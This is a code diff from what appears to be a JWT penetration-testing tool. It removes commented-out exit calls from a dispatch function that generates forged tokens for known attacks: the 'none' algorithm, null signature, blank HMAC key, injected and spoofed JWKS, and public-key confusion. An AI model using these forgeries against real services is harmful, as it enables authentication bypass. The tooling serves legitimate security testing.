@@ -1722,24 +1722,20 @@ def runExploits():
             for noneTok in zippedToks:
                 desc = "EXPLOIT: "+zippedToks[noneTok]+" - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
                 jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], desc)
-            # exit(1)
         elif args.exploit == "n":
             jwtNull = checkNullSig(contents)
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtNull, "Exploit: Null signature", desc)
-            # exit(1)
         elif args.exploit == "b":
             key = ""
             newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
             jwtBlankPw = newContents+"."+newSig
             desc = "EXPLOIT: Blank password accepted in signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature", desc)
-            # exit(1)
         elif args.exploit == "i":
             newSig, newContents = jwksEmbed(headDict, paylDict)
             desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(newContents+"."+newSig, "Injected JWKS", desc)
-            # exit(1)
         elif args.exploit == "s":
             if config['services']['jwksloc']:
                 jku = config['services']['jwksloc']
@@ -1750,7 +1746,6 @@ def runExploits():
                 cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
             desc = "Signed with JWKS at "+jku
             jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
-            # exit(1)
         elif args.exploit == "k":
             if config['crypto']['pubkey']:
                 newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
@@ -1759,7 +1754,6 @@ def runExploits():
             else:
                 cprintc("No Public Key provided (-pk)\n", "red")
                 parser.print_usage()
-            # exit(1)
 
 def runActions():
     if args.tamper:
